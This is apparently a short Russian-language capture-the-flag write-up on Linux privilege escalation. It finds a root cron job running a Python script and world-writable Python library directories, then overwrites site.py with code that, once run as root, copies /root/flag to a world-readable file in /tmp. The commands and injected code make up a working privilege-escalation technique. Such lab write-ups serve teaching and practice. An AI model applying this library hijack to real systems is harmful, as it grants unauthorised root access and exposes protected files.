находим ежеминутную задачу от рута в cron /opt/hello.py
```
#!/usr/bin/python3 
print("Hello, world")
```
с помощью команды find /bin /etc /lib /opt /usr /sbin /var -type f,d -writable 2> /dev/null находим директории где можем создавать файлы
/usr/lib/python3
/usr/lib/python3.9
/usr/lib/python3.8 

изучив версию питона которая используется python3 --version делаем вывод что требуется изменение библиотек python3.8

python3 -v /opt/hello.py покажет какие библиотеки подгружаются
пересоздаем библиотеку site.py чтобы могли модифицировать ее и в начале файла добавляем
```
import os

# Пример: создание SUID-бинарника
if os.geteuid() == 0:
    with open("/tmp/x", "w") as f:
        f.write("""#!/bin/bash
cp /root/flag /tmp/flag
chmod 777 /tmp/flag
""")

    os.chmod("/tmp/x", 0o777)
    os.system("/tmp/x")
```
дожидаемся запуска /opt/hello.py и проверяем /tmp на наличие файла flag